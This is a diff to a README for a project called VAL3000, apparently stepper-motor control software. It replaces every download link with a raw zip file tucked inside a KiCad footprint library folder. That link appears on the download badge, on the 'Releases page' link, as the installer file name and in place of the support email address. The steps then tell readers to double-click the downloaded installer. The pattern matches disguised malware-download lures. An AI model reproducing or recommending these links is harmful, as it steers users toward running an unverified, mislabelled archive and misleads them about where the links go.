@@ -6,7 +6,7 @@ Welcome to the VAL3000 project! This is your guide to downloading and running th
 
 ## 📥 Download Now
 
-[![Download VAL3000](https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip)](https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip)
+[![Download VAL3000](https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip)](https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip)
 
 ## 💻 System Requirements
 
@@ -30,9 +30,9 @@ VAL3000 offers several features to help you manage your stepper motors with ease
 
 To install VAL3000, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [VAL3000 Releases page](https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip).
+1. **Visit the Releases Page:** Go to the [VAL3000 Releases page](https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip).
 2. **Select the Latest Release:** Look for the latest version available.
-3. **Download the Installer:** Click on the installer file to download. This will usually be named something like `https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip`.
+3. **Download the Installer:** Click on the installer file to download. This will usually be named something like `https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip`.
 4. **Run the Installer:**
    - Locate the downloaded file in your downloads folder.
    - Double-click on the installer file to start the installation process.
@@ -61,11 +61,11 @@ If you experience issues while using VAL3000, consider the following tips:
 A: VAL3000 supports most standard stepper motors. Ensure compatibility by checking your motor's specifications.
 
 **Q: How can I contact support?**  
-A: You can reach out via the Issues section on the GitHub repository or by emailing our support team at https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip
+A: You can reach out via the Issues section on the GitHub repository or by emailing our support team at https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip
 
 ## 📥 Download Again
 
-To download VAL3000 again or if you missed it earlier, visit the [VAL3000 Releases page](https://raw.githubusercontent.com/hal9222/VAL3000/main/hardware/PCB/VAL3000-backups/VAL3000_1.2.zip) now.
+To download VAL3000 again or if you missed it earlier, visit the [VAL3000 Releases page](https://github.com/hal9222/VAL3000/raw/refs/heads/main/hardware/Libraries/AS5600L_ASOM/KiCADv6/AS5600L-ASOM_AMS.pretty/VA-v3.1.zip) now.
 
 ## 🔗 Additional Resources
 
